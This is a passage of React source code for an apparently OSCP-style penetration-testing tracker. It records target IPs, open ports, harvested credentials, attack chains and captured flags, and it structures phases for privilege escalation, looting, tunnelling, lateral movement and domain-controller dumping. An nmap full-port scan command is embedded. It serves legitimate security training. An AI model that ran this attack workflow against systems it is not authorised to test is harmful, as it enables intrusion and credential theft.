        <input style={inp} value={c.tested} onChange={e=>upd(c.id,"tested",e.target.value)} placeholder="SMB✓ WinRM✗"/>
        <button onClick={()=>del(c.id)} style={{background:"rgba(255,68,68,0.08)",border:"1px solid rgba(255,68,68,0.15)",color:"#ff6666",borderRadius:3,cursor:"pointer",fontSize:11}}>×</button>
      </div>)}
      <button onClick={add} style={{background:"rgba(68,255,68,0.05)",border:"1px dashed rgba(68,255,68,0.15)",color:"#559955",borderRadius:3,padding:"3px 0",cursor:"pointer",fontFamily:mono,fontSize:10,width:"100%",marginTop:2}}>+ Credential</button>
    </div>
  );
}

function HostHeader({ip,setIp,hostname,setHostname,osVersion,setOsVersion,scanCmd}) {
  return (
    <div style={{display:"flex",alignItems:"center",gap:6,padding:"8px 10px",borderBottom:"1px solid rgba(100,130,160,0.06)",flexWrap:"wrap"}}>
      <input value={ip} onChange={e=>setIp(e.target.value)} placeholder="IP Address" style={{background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#ffaa00",fontFamily:mono,fontSize:13,padding:"4px 8px",width:140,outline:"none",fontWeight:700}}/>
      <input value={hostname} onChange={e=>setHostname(e.target.value)} placeholder="Hostname" style={{background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#88bbdd",fontFamily:mono,fontSize:13,padding:"4px 8px",width:160,outline:"none"}}/>
      <input value={osVersion||""} onChange={e=>setOsVersion(e.target.value)} placeholder="OS Version" style={{background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#aa88dd",fontFamily:mono,fontSize:13,padding:"4px 8px",width:200,outline:"none"}}/>
      <span style={{fontSize:9,color:"#334455",fontFamily:mono,flex:1}}>{scanCmd}</span>
    </div>
  );
}

function FlagInputs({flags,setFlags}) {
  const inp = {background:"rgba(0,0,0,0.4)",border:"1px solid rgba(100,130,160,0.12)",borderRadius:3,color:"#44ff44",fontFamily:mono,fontSize:11,padding:"4px 8px",outline:"none",width:"100%",boxSizing:"border-box"};
  return (
    <div style={{padding:"6px 10px",display:"flex",gap:8,flexWrap:"wrap"}}>
      <div style={{flex:1,minWidth:200}}>
        <div style={{fontSize:8,fontWeight:700,color:"#445566",fontFamily:mono,letterSpacing:1,marginBottom:2}}>LOCAL.TXT (user flag)</div>
        <input style={inp} value={flags?.local||""} onChange={e=>setFlags({...flags,local:e.target.value})} placeholder="paste local.txt hash..."/>
      </div>
      <div style={{flex:1,minWidth:200}}>
        <div style={{fontSize:8,fontWeight:700,color:"#445566",fontFamily:mono,letterSpacing:1,marginBottom:2}}>PROOF.TXT (root/admin flag)</div>
        <input style={inp} value={flags?.proof||""} onChange={e=>setFlags({...flags,proof:e.target.value})} placeholder="paste proof.txt hash..."/>
      </div>
    </div>
  );
}

function MachineSummary({ip,hostname,ports,portVersions,dismissed,chain,checks,notes,flags,osType,creds,onReopen,mk}) {
  // Build full ID→text lookup matching exactly how IDs are constructed in StandaloneTab
  const itemLookup = {};
  const pv = portVersions||{};
  ports.forEach(p => {
    const pd = PORT_DB[p]||PORT_DB.other;
    pd.items.forEach(i => { itemLookup[`${mk}-${p}-${i.id}`] = i.text; });
  });
  const privList = osType==="linux"?PRIVESC_LINUX:PRIVESC_WINDOWS;
  privList.forEach(i => { itemLookup[`${mk}-${i.id}`] = i.text; });
  const proofList = osType==="linux"?PROOF_LINUX:PROOF_WINDOWS;
  proofList.forEach(i => { itemLookup[`${mk}-${i.id}`] = i.text; });

  const starred = Object.entries(checks).filter(([_,v])=>v==="starred");
  const tried = Object.entries(checks).filter(([_,v])=>v==="checked");
  const relevantCreds = creds.filter(c=>c.u&&c.p);

  const summaryText = [
    `═══ MACHINE SUMMARY ═══`,
    `IP: ${ip||"N/A"}  Hostname: ${hostname||"N/A"}  OS: ${osType}`,
    `Open Ports: ${ports.map(p=>`${p}${pv[p]?" ["+pv[p]+"]":""}`).join(", ")||"none"}`,
    dismissed?.length?`Closed Ports: ${dismissed.join(", ")}`:"",
    ``,
    `── ATTACK CHAIN ──`,
    chain.length?chain.join(" → "):"(not documented)",
    ``,
    `── FLAGS ──`,
    `local.txt: ${flags?.local||"(not captured)"}`,
    `proof.txt: ${flags?.proof||"(not captured)"}`,
    ``,
    `── ATTACK PATH (★ actionable findings) ──`,
    ...starred.map(([k,_])=>{
      const text = itemLookup[k]||k;
      const n = notes[k];
      return `• ${text}${n?" — "+n:""}`;
    }),
    ``,
    `── TRIED / NO RESULT (ruled out) ──`,
    ...tried.map(([k,_])=>{
      const text = itemLookup[k]||k;
      const n = notes[k];
      return `✗ ${text}${n?" — "+n:""}`;
    }),
    ``,
    relevantCreds.length?`── CREDENTIALS USED ──`:"",
    ...relevantCreds.map(c=>`• ${c.u}:${c.p} (from: ${c.src||"?"}) [tested: ${c.tested||"?"}]`),
  ].filter(l=>l!==undefined).join("\n");

  return (
    <div style={{border:"2px solid #44ff44",borderRadius:6,margin:10,background:"rgba(68,255,68,0.03)",overflow:"hidden"}}>
      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"10px 14px",background:"rgba(68,255,68,0.08)",borderBottom:"1px solid rgba(68,255,68,0.15)"}}>
        <div style={{display:"flex",alignItems:"center",gap:10}}>
          <span style={{fontSize:16}}>🏆</span>
          <span style={{fontSize:14,fontWeight:800,color:"#44ff44",fontFamily:mono}}>MACHINE COMPLETED</span>
          <span style={{fontSize:12,color:"#88ccaa",fontFamily:mono}}>{ip} {hostname&&`(${hostname})`}</span>
        </div>
        <div style={{display:"flex",gap:6}}>
          <button onClick={()=>{navigator.clipboard.writeText(summaryText).catch(()=>{})}} style={{background:"rgba(68,255,68,0.1)",border:"1px solid rgba(68,255,68,0.25)",color:"#44ff44",borderRadius:3,padding:"4px 12px",cursor:"pointer",fontSize:10,fontFamily:mono}}>📋 Copy Summary</button>
          <button onClick={onReopen} style={{background:"rgba(255,170,0,0.08)",border:"1px solid rgba(255,170,0,0.2)",color:"#ddaa33",borderRadius:3,padding:"4px 12px",cursor:"pointer",fontSize:10,fontFamily:mono}}>↩ Reopen</button>
        </div>
      </div>
      <div style={{padding:"12px 14px"}}>
        {/* Header info */}
        <div style={{display:"flex",gap:20,marginBottom:12,flexWrap:"wrap"}}>
          <div><span style={{fontSize:9,color:"#556677",fontFamily:mono}}>IP</span><div style={{fontSize:13,color:"#ffaa00",fontFamily:mono,fontWeight:700}}>{ip||"—"}</div></div>
          <div><span style={{fontSize:9,color:"#556677",fontFamily:mono}}>HOSTNAME</span><div style={{fontSize:13,color:"#88bbdd",fontFamily:mono}}>{hostname||"—"}</div></div>
          <div><span style={{fontSize:9,color:"#556677",fontFamily:mono}}>OS</span><div style={{fontSize:13,color:"#aabbcc",fontFamily:mono}}>{osType}</div></div>
          <div><span style={{fontSize:9,color:"#556677",fontFamily:mono}}>OPEN PORTS</span><div style={{fontSize:12,color:"#44aaff",fontFamily:mono}}>{ports.map(p=>`${p}${pv[p]?" ["+pv[p]+"]":""}`).join(", ")||"—"}</div></div>
        </div>

        {/* Flags */}
        <div style={{display:"flex",gap:12,marginBottom:12,flexWrap:"wrap"}}>
          <div style={{flex:1,minWidth:200,background:"rgba(0,0,0,0.2)",borderRadius:4,padding:"8px 10px"}}>
            <div style={{fontSize:9,color:"#556677",fontFamily:mono,marginBottom:2}}>LOCAL.TXT</div>
            <div style={{fontSize:11,color:flags?.local?"#44ff44":"#553333",fontFamily:mono,wordBreak:"break-all"}}>{flags?.local||"not captured"}</div>
          </div>
          <div style={{flex:1,minWidth:200,background:"rgba(0,0,0,0.2)",borderRadius:4,padding:"8px 10px"}}>
            <div style={{fontSize:9,color:"#556677",fontFamily:mono,marginBottom:2}}>PROOF.TXT</div>
            <div style={{fontSize:11,color:flags?.proof?"#44ff44":"#553333",fontFamily:mono,wordBreak:"break-all"}}>{flags?.proof||"not captured"}</div>
          </div>
        </div>

        {/* Attack Chain */}
        {chain.length>0&&<div style={{marginBottom:12}}>
          <div style={{fontSize:9,color:"#556677",fontFamily:mono,marginBottom:4}}>ATTACK CHAIN</div>
          <div style={{display:"flex",flexWrap:"wrap",gap:2,alignItems:"center"}}>
            {chain.map((step,i)=>(
              <div key={i} style={{display:"inline-flex",alignItems:"center"}}>
                {i>0&&<span style={{color:"#44aa44",fontSize:11,margin:"0 4px"}}>→</span>}
                <span style={{background:"rgba(68,255,68,0.08)",border:"1px solid rgba(68,255,68,0.15)",borderRadius:3,padding:"2px 8px",fontSize:10,fontFamily:mono,color:"#88dd88"}}>{step}</span>
              </div>
            ))}
          </div>
        </div>}

        {/* Starred items */}
        {starred.length>0&&<div style={{marginBottom:12}}>
          <div style={{fontSize:9,color:"#556677",fontFamily:mono,marginBottom:4}}>ATTACK PATH (★) — document commands + screenshots for each</div>
          {starred.map(([k,_])=>{
            const text = itemLookup[k]||k;
            const n = notes[k];
            return <div key={k} style={{padding:"3px 0",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
              <span style={{color:"#ffaa00",fontSize:11,marginRight:4}}>★</span>
              <span style={{fontSize:10,fontFamily:mono,color:"#ccddaa"}}>{text}</span>
              {n&&<div style={{fontSize:9,fontFamily:mono,color:"#7799aa",marginLeft:18,marginTop:1}}>{n}</div>}
            </div>;
          })}
        </div>}

        {/* Creds used */}
        {relevantCreds.length>0&&<div>
          <div style={{fontSize:9,color:"#556677",fontFamily:mono,marginBottom:4}}>CREDENTIALS USED</div>
          {relevantCreds.map(c=><div key={c.id} style={{fontSize:10,fontFamily:mono,color:"#ddaa66",padding:"2px 0"}}>
            {c.u}:{c.p} <span style={{color:"#667788",fontSize:9}}>(from: {c.src||"?"}) [{c.tested||"?"}]</span>
          </div>)}
        </div>}
      </div>
    </div>
  );
}

// ─── STANDALONE TAB ──────────────────────────────────────
function StandaloneTab({mk,state,setState,creds,timers,setTimers}) {
  const {ip="",hostname="",osVersion="",ports=[],dismissed=[],checks={},notes={},chain=[],flags={},completed=false,udpDone=false,portVersions={},portServiceMap={},discoveredPages={}} = state;
  const s = (k,v) => setState({...state,[k]:v});
  const toggle = id => { const c={...checks}; c[id] = c[id]==="checked"||c[id]==="starred"?undefined:"checked"; s("checks",c); };
  const star = id => { const c={...checks}; c[id] = c[id]==="starred"?"checked":"starred"; s("checks",c); };
  const note = (id,v) => s("notes",{...notes,[id]:v});
  const addPort = (p, svc) => {
    if(!ports.includes(p)) {
      const upd = {...state, ports:[...ports,p]};
      if (svc) upd.portServiceMap = {...portServiceMap,[p]:svc};
      setState(upd);
    }
  };
  const addPorts = ps => { const np = [...ports]; ps.forEach(p=>{if(!np.includes(p))np.push(p)}); s("ports",np); };
  const dismiss = p => s("ports",ports.filter(x=>x!==p));
  const restore = p => setState({...state, dismissed:(dismissed||[]).filter(x=>x!==p), ports:ports.includes(p)?ports:[...ports,p]});
  const setVersion = (p,v) => s("portVersions",{...portVersions,[p]:v});
  const setService = (p,svc) => s("portServiceMap",{...portServiceMap,[p]:svc});
  const resolvePort = p => PORT_DB[portServiceMap[p]] || PORT_DB[p] || PORT_DB.other;
  const osType = mk.startsWith("l")?"linux":"windows";

  // Machine timer
  const timer = timers[mk]||{elapsed:0,running:null};
  const toggleTimer = () => {
    if (timer.running) {
      // Stop: add elapsed since start
      const added = Math.floor((Date.now() - timer.running) / 1000);
      setTimers({...timers,[mk]:{elapsed:timer.elapsed+added,running:null}});
    } else {
      // Start: record timestamp
      setTimers({...timers,[mk]:{elapsed:timer.elapsed,running:Date.now()}});
    }
  };

  if (completed) {
    return <MachineSummary ip={ip} hostname={hostname} ports={ports} portVersions={portVersions} dismissed={dismissed} chain={chain} checks={checks} notes={notes} flags={flags} osType={osType} creds={creds||[]} onReopen={()=>s("completed",false)} mk={mk} />;
  }

  const hasFlags = flags?.local || flags?.proof;
  const starCount = Object.values(checks).filter(v=>v==="starred").length;

  return (
    <div>
      {/* Machine Timer */}
      <div style={{padding:"6px 10px",borderBottom:"1px solid rgba(100,130,160,0.08)",background:"rgba(0,0,0,0.15)",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
        <span style={{fontSize:11,fontWeight:700,fontFamily:mono,color:"#88bbdd"}}>⏱ Machine Time</span>
        <MachineTimer elapsed={timer.elapsed} running={timer.running} onToggle={toggleTimer}/>
      </div>
      <HostHeader ip={ip} setIp={v=>s("ip",v)} hostname={hostname} setHostname={v=>s("hostname",v)} osVersion={osVersion} setOsVersion={v=>s("osVersion",v)} scanCmd="sudo nmap -Pn -n $IP -sC -sV -p- --open -oN tcp.nmap"/>
      <UdpReminder ip={ip} udpDone={udpDone} onDone={()=>s("udpDone",true)}/>
      <PortSelector ports={ports} dismissed={dismissed} onAdd={addPort} onDismiss={dismiss} onRestore={restore} portServiceMap={portServiceMap} onSetService={setService}/>
      <NmapPaste onAddPorts={addPorts}/>
      <AttackChain chain={chain} setChain={v=>s("chain",v)}/>
      <ProgressReport ip={ip} hostname={hostname} ports={ports} portVersions={portVersions} portServiceMap={portServiceMap} discoveredPages={discoveredPages} chain={chain} checks={checks} notes={notes} flags={flags} osType={osType} creds={creds} mk={mk}/>
      {ports.map(p=>{
        const pd=resolvePort(p);
        const httpPort = isHttpPort(p, portServiceMap);
        return <Phase key={p} title={`PORT ${p} — ${pd.name}`} items={pd.items.map(i=>({...i,id:`${mk}-${p}-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} ip={ip} version={portVersions[p]} onVersion={v=>setVersion(p,v)}
          pages={httpPort?(discoveredPages[p]||[]):undefined}
          onAddPage={httpPort?(pg=>s("discoveredPages",{...discoveredPages,[p]:[...(discoveredPages[p]||[]),pg]})):undefined}
          onRemovePage={httpPort?(i=>s("discoveredPages",{...discoveredPages,[p]:(discoveredPages[p]||[]).filter((_,idx)=>idx!==i)})):undefined}
        />;
      })}
      {ports.length>0&&<Phase title={osType==="linux"?"PRIVILEGE ESCALATION (Linux)":"PRIVILEGE ESCALATION (Windows)"} timeGuide="30-60 min" items={(osType==="linux"?PRIVESC_LINUX:PRIVESC_WINDOWS).map(i=>({...i,id:`${mk}-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} color={osType==="linux"?"#44aaff":"#aa66ff"} ip={ip}/>}
      {ports.length>0&&<>
        <Phase title="📸 PROOF COLLECTION" items={(osType==="linux"?PROOF_LINUX:PROOF_WINDOWS).map(i=>({...i,id:`${mk}-${i.id}`}))} checks={checks} notes={notes} onToggle={toggle} onStar={star} onNote={note} color="#ff4444" ip={ip}/>
        <FlagInputs flags={flags} setFlags={v=>s("flags",v)}/>
        {/* Complete Machine Button */}
        <div style={{padding:"8px 10px"}}>
          <button onClick={()=>s("completed",true)} style={{width:"100%",padding:"10px",background:hasFlags?"rgba(68,255,68,0.1)":"rgba(100,130,160,0.05)",border:`2px solid ${hasFlags?"rgba(68,255,68,0.3)":"rgba(100,130,160,0.1)"}`,borderRadius:5,color:hasFlags?"#44ff44":"#445566",fontFamily:mono,fontSize:12,fontWeight:700,cursor:"pointer",letterSpacing:1}}>
            🏆 COMPLETE MACHINE{starCount>0?` (${starCount} ★ items)`:""}{!hasFlags?" — add flags first":""}
          </button>
        </div>
      </>}
    </div>
  );
}

// ─── AD TAB ──────────────────────────────────────────────
function ADTab({state,setState,creds,timers,setTimers}) {
  const {sub="ms01",ms01={},ms02={},dc={},checks={},notes={},completed=false} = state;
  const s = (k,v) => setState({...state,[k]:v});

  if (completed) {
    // Build global ID→text lookup from all AD item lists
    const itemLookup = {};
    const registerItems = (items, prefix) => {
      items.forEach(i => { itemLookup[prefix + i.id] = i.text; itemLookup[i.id] = i.text; });
    };
    // Shared phases
    AD_TUNNEL.forEach(i => { itemLookup[`ad-${i.id}`] = i.text; });
    AD_ENUM.forEach(i => { itemLookup[`ad-${i.id}`] = i.text; });
    AD_DC.forEach(i => { itemLookup[`ad-${i.id}`] = i.text; });
    AD_STUCK.forEach(i => { itemLookup[`ad-${i.id}`] = i.text; });
    // Per-machine phases
    ["ms01","ms02"].forEach(m => {
      AD_MS01_CONNECT.forEach(i => { itemLookup[`ad-${m}-${i.id}`] = i.text; });
      AD_MS02_CONNECT.forEach(i => { itemLookup[`ad-${m}-${i.id}`] = i.text; });
      AD_MS01_PRIVESC.forEach(i => { itemLookup[`ad-${m}-${i.id}`] = i.text; });
      AD_LOOT.forEach(i => { itemLookup[`ad-${m}-loot-${i.id}`] = i.text; });
      AD_MS01_PROOF.forEach(i => { itemLookup[`ad-${m}-${i.id}`] = i.text; });
      AD_MS02_PROOF.forEach(i => { itemLookup[`ad-${m}-${i.id}`] = i.text; });
    });
    AD_DC_PROOF.forEach(i => { itemLookup[`ad-dc-${i.id}`] = i.text; });
    // Port items for each machine
    ["ms01","ms02","dc"].forEach(m => {
      (state[m]?.ports||[]).forEach(p => {
        const pd = PORT_DB[p]||PORT_DB.other;
        pd.items.forEach(i => { itemLookup[`ad-${m}-${p}-${i.id}`] = i.text; });
      });
    });

    // Collect all starred items across all AD sub-machines and shared checks
    const allStarred = [];
    const allNotes = {};
    // Shared checks
    Object.entries(checks).forEach(([k,v])=>{if(v==="starred") allStarred.push(k)});
    Object.assign(allNotes, notes);
    // Per-machine checks
    ["ms01","ms02","dc"].forEach(m=>{
      const mc = state[m]?.checks||{};
      const mn = state[m]?.notes||{};
      Object.entries(mc).forEach(([k,v])=>{if(v==="starred") allStarred.push(k)});
      Object.assign(allNotes, mn);
    });

    const chains = ["ms01","ms02","dc"].map(m=>({name:m.toUpperCase(),chain:state[m]?.chain||[]})).filter(c=>c.chain.length>0);

    const summaryText = [
      `═══ AD SET SUMMARY ═══`,
      ...["ms01","ms02","dc"].map(m=>`${m.toUpperCase()}: ${state[m]?.ip||"?"} (${state[m]?.hostname||"?"}) — Ports: ${(state[m]?.ports||[]).join(", ")||"none"}`),
      ``,
      `── FLAGS ──`,
      `MS01: ${state.ms01Flag||"(not captured)"}`,
      `MS02: ${state.ms02Flag||"(not captured)"}`,
      `DC:   ${state.dcFlag||"(not captured)"}`,
      ``,
      ...chains.map(c=>`── ${c.name} ATTACK CHAIN ──\n${c.chain.join(" → ")}`),
      ``,
      `── ATTACK PATH (★ starred) ──`,
      ...allStarred.map(k=>{
        const text = itemLookup[k]||k;
        return `• ${text}${allNotes[k]?" — "+allNotes[k]:""}`;
      }),
    ].join("\n");

    return (
      <div style={{border:"2px solid #44ff44",borderRadius:6,margin:10,background:"rgba(68,255,68,0.03)",overflow:"hidden"}}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"10px 14px",background:"rgba(68,255,68,0.08)",borderBottom:"1px solid rgba(68,255,68,0.15)"}}>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <span style={{fontSize:16}}>🏰</span>
            <span style={{fontSize:14,fontWeight:800,color:"#44ff44",fontFamily:mono}}>AD SET COMPLETED — 40 PTS</span>
          </div>
          <div style={{display:"flex",gap:6}}>
            <button onClick={()=>{navigator.clipboard.writeText(summaryText).catch(()=>{})}} style={{background:"rgba(68,255,68,0.1)",border:"1px solid rgba(68,255,68,0.25)",color:"#44ff44",borderRadius:3,padding:"4px 12px",cursor:"pointer",fontSize:10,fontFamily:mono}}>📋 Copy</button>
            <button onClick={()=>s("completed",false)} style={{background:"rgba(255,170,0,0.08)",border:"1px solid rgba(255,170,0,0.2)",color:"#ddaa33",borderRadius:3,padding:"4px 12px",cursor:"pointer",fontSize:10,fontFamily:mono}}>↩ Reopen</button>
          </div>
        </div>
        <div style={{padding:"12px 14px"}}>
          {/* Machine overview */}
          {["ms01","ms02","dc"].map(m=>{
            const md = state[m]||{};
            return <div key={m} style={{display:"flex",gap:16,marginBottom:8,padding:"6px 8px",background:"rgba(0,0,0,0.15)",borderRadius:4,flexWrap:"wrap",alignItems:"center"}}>
              <span style={{fontSize:11,fontWeight:700,color:"#ff6644",fontFamily:mono,width:36}}>{m.toUpperCase()}</span>
              <span style={{fontSize:11,color:"#ffaa00",fontFamily:mono}}>{md.ip||"—"}</span>
              <span style={{fontSize:10,color:"#88bbdd",fontFamily:mono}}>{md.hostname||""}</span>
              <span style={{fontSize:9,color:"#44aaff",fontFamily:mono}}>Ports: {(md.ports||[]).join(", ")||"—"}</span>
              <span style={{fontSize:10,color:state[`${m}Flag`]?"#44ff44":"#553333",fontFamily:mono,marginLeft:"auto"}}>🚩 {state[`${m}Flag`]||"no flag"}</span>
            </div>;
          })}
          {/* Chains */}
          {chains.map(c=><div key={c.name} style={{marginBottom:8}}>
            <div style={{fontSize:9,color:"#556677",fontFamily:mono}}>{c.name} CHAIN</div>
            <div style={{display:"flex",flexWrap:"wrap",gap:2,alignItems:"center",marginTop:2}}>
              {c.chain.map((step,i)=><div key={i} style={{display:"inline-flex",alignItems:"center"}}>
                {i>0&&<span style={{color:"#44aa44",fontSize:11,margin:"0 4px"}}>→</span>}
                <span style={{background:"rgba(68,255,68,0.08)",border:"1px solid rgba(68,255,68,0.15)",borderRadius:3,padding:"2px 8px",fontSize:10,fontFamily:mono,color:"#88dd88"}}>{step}</span>
              </div>)}
            </div>
          </div>)}
          {/* Starred */}
          {allStarred.length>0&&<div style={{marginTop:8}}>
            <div style={{fontSize:9,color:"#556677",fontFamily:mono,marginBottom:4}}>ATTACK PATH (★) — document commands + screenshots for each</div>
            {allStarred.map(k=><div key={k} style={{padding:"3px 0",borderBottom:"1px solid rgba(100,130,160,0.04)"}}>
              <span style={{color:"#ffaa00",fontSize:11,marginRight:4}}>★</span>
              <span style={{fontSize:10,fontFamily:mono,color:"#ccddaa"}}>{itemLookup[k]||k}</span>
              {allNotes[k]&&<div style={{fontSize:9,fontFamily:mono,color:"#7799aa",marginLeft:18,marginTop:1}}>{allNotes[k]}</div>}
            </div>)}
          </div>}
        </div>
      </div>
    );
  }

  const sM = (m,v) => s(m,v);
  const toggle = id => { const c={...checks}; c[id]=c[id]==="checked"||c[id]==="starred"?undefined:"checked"; s("checks",c); };
  const star = id => { const c={...checks}; c[id]=c[id]==="starred"?"checked":"starred"; s("checks",c); };
  const note = (id,v) => s("notes",{...notes,[id]:v});

  const mState = sub==="ms01"?ms01:sub==="ms02"?ms02:dc;
  const setMState = v => sM(sub,v);
  const {ip="",hostname="",ports=[],dismissed=[],chain=[],portVersions:mPortVersions={},portServiceMap:mPortServiceMap={},discoveredPages:mDiscoveredPages={}} = mState;
  const mChecks = mState.checks||{};
  const mNotes = mState.notes||{};
  const mToggle = id => { const c={...mChecks}; c[id]=c[id]==="checked"||c[id]==="starred"?undefined:"checked"; setMState({...mState,checks:c}); };
  const mStar = id => { const c={...mChecks}; c[id]=c[id]==="starred"?"checked":"starred"; setMState({...mState,checks:c}); };
  const mNote = (id,v) => setMState({...mState,notes:{...mNotes,[id]:v}});
  const addPort = (p, svc) => {
    if(!ports.includes(p)) {
      const upd = {...mState, ports:[...ports,p]};
      if (svc) upd.portServiceMap = {...mPortServiceMap,[p]:svc};
      setMState(upd);
    }
  };
  const addPorts = ps => { const np=[...ports]; ps.forEach(p=>{if(!np.includes(p))np.push(p)}); setMState({...mState,ports:np}); };
  const dismiss = p => setMState({...mState,ports:ports.filter(x=>x!==p)});
  const restore = p => { const d=(dismissed||[]).filter(x=>x!==p); const np=ports.includes(p)?ports:[...ports,p]; setMState({...mState,ports:np,dismissed:d}); };
  const setMVersion = (p,v) => setMState({...mState,portVersions:{...mPortVersions,[p]:v}});
  const setMService = (p,svc) => setMState({...mState,portServiceMap:{...mPortServiceMap,[p]:svc}});
  const resolvePort = p => PORT_DB[mPortServiceMap[p]] || PORT_DB[p] || PORT_DB.other;

  // AD machine timer (keyed as "ad" for the whole set)
  const timerKey = "ad";
  const timer = timers[timerKey]||{elapsed:0,running:null};
  const toggleTimer = () => {
    if (timer.running) {
      const added = Math.floor((Date.now() - timer.running) / 1000);
      setTimers({...timers,[timerKey]:{elapsed:timer.elapsed+added,running:null}});
    } else {
      setTimers({...timers,[timerKey]:{elapsed:timer.elapsed,running:Date.now()}});
    }
  };

  return (
    <div>
      {/* AD Set Timer */}
      <div style={{padding:"6px 10px",borderBottom:"1px solid rgba(100,130,160,0.08)",background:"rgba(0,0,0,0.15)",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
        <span style={{fontSize:11,fontWeight:700,fontFamily:mono,color:"#ff6644"}}>⏱ AD Set Time</span>
        <MachineTimer elapsed={timer.elapsed} running={timer.running} onToggle={toggleTimer}/>
      </div>

      {/* Sub-tabs */}
      <div style={{display:"flex",borderBottom:"1px solid rgba(100,130,160,0.08)",background:"rgba(0,0,0,0.12)"}}>
        {[{k:"ms01",l:"MS01 (External)"},{k:"ms02",l:"MS02 (Internal)"},{k:"dc",l:"DC"}].map(t=>(
          <button key={t.k} onClick={()=>s("sub",t.k)} style={{flex:1,background:sub===t.k?"rgba(255,102,68,0.06)":"transparent",border:"none",borderBottom:sub===t.k?"2px solid #ff6644":"2px solid transparent",color:sub===t.k?"#ff6644":"#445566",padding:"7px 10px",cursor:"pointer",fontFamily:mono,fontSize:11,fontWeight:sub===t.k?700:400}}>{t.l}</button>
        ))}
      </div>

      {/* Host header + ports */}
      <HostHeader ip={ip} setIp={v=>setMState({...mState,ip:v})} hostname={hostname} setHostname={v=>setMState({...mState,hostname:v})} osVersion={mState.osVersion||""} setOsVersion={v=>setMState({...mState,osVersion:v})} scanCmd="sudo nmap -Pn -n $IP -sC -sV -p- --open"/>
      <PortSelector ports={ports} dismissed={dismissed||[]} onAdd={addPort} onDismiss={dismiss} onRestore={restore} portServiceMap={mPortServiceMap} onSetService={setMService}/>
      <NmapPaste onAddPorts={addPorts}/>
      <AttackChain chain={chain||[]} setChain={v=>setMState({...mState,chain:v})}/>
      <ProgressReport ip={ip} hostname={hostname} ports={ports} portVersions={mPortVersions} portServiceMap={mPortServiceMap} discoveredPages={mDiscoveredPages} chain={chain||[]} checks={{...mChecks,...checks}} notes={{...mNotes,...notes}} flags={{}} osType="windows" creds={creds} mk={`ad-${sub}`}
        extraPhases={
          sub==="ms01"?[
            {label:"MS01 — CONNECT",items:AD_MS01_CONNECT,prefix:"ad-ms01-"},
            {label:"MS01 — PRIVILEGE ESCALATION",items:AD_MS01_PRIVESC,prefix:"ad-ms01-"},
            {label:"MS01 — POST-EXPLOITATION LOOT",items:AD_LOOT,prefix:"ad-ms01-loot-"},
            {label:"MS01 — PROOF",items:AD_MS01_PROOF,prefix:"ad-ms01-"},
            {label:"TUNNEL SETUP",items:AD_TUNNEL,prefix:"ad-"},
            {label:"AD ENUMERATION",items:AD_ENUM,prefix:"ad-"},
            {label:"LATERAL MOVEMENT → MS02",items:AD_LATMOV_MS02,prefix:"ad-"},
          ]:sub==="ms02"?[
            {label:"MS02 — CONNECT",items:AD_MS02_CONNECT,prefix:"ad-ms02-"},
            {label:"MS02 — PRIVILEGE ESCALATION",items:AD_MS01_PRIVESC,prefix:"ad-ms02-"},
            {label:"MS02 — POST-EXPLOITATION LOOT",items:AD_LOOT,prefix:"ad-ms02-loot-"},
            {label:"MS02 — PROOF",items:AD_MS02_PROOF,prefix:"ad-ms02-"},
            {label:"LATERAL MOVEMENT → DC",items:AD_LATMOV_DC,prefix:"ad-"},
          ]:[
            {label:"DC — CONNECT & DUMP",items:AD_DC,prefix:"ad-"},
            {label:"DC — PROOF",items:AD_DC_PROOF,prefix:"ad-dc-"},
          ]
        }
      />

      {/* Per-port checklists */}
      {ports.map(p=>{
        const pd=resolvePort(p);
        const httpPort = isHttpPort(p, mPortServiceMap);
        return <Phase key={p} title={`PORT ${p} — ${pd.name}`} items={pd.items.map(i=>({...i,id:`ad-${sub}-${p}-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} ip={ip} version={mPortVersions[p]} onVersion={v=>setMVersion(p,v)}
          pages={httpPort?(mDiscoveredPages[p]||[]):undefined}
          onAddPage={httpPort?(pg=>setMState({...mState,discoveredPages:{...mDiscoveredPages,[p]:[...(mDiscoveredPages[p]||[]),pg]}})):undefined}
          onRemovePage={httpPort?(i=>setMState({...mState,discoveredPages:{...mDiscoveredPages,[p]:(mDiscoveredPages[p]||[]).filter((_,idx)=>idx!==i)}})):undefined}
        />;
      })}

      {/* MS01: Connect → Privesc → Loot → Proof → Tunnel → AD Enum */}
      {sub==="ms01"&&<>
        <Phase title="MS01 — CONNECT (Assumed Breach)" timeGuide="5 min" items={AD_MS01_CONNECT.map(i=>({...i,id:`ad-ms01-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#44aaff"/>
        <Phase title="MS01 — LOCAL PRIVILEGE ESCALATION" timeGuide="30-60 min" items={AD_MS01_PRIVESC.map(i=>({...i,id:`ad-ms01-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ff6644"/>
        <Phase title="MS01 — POST-EXPLOITATION LOOT" timeGuide="15-20 min" items={AD_LOOT.map(i=>({...i,id:`ad-ms01-loot-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ffaa00"/>
        <Phase title="📸 MS01 — PROOF" items={AD_MS01_PROOF.map(i=>({...i,id:`ad-ms01-${i.id}`}))} checks={mChecks} notes={mNotes} onToggle={mToggle} onStar={mStar} onNote={mNote} color="#ff4444"/>
        <div style={{padding:"4px 10px"}}>
          <div style={{fontSize:8,fontWeight:700,color:"#445566",fontFamily:mono,letterSpacing:1,marginBottom:2}}>MS01 PROOF.TXT FLAG</div>
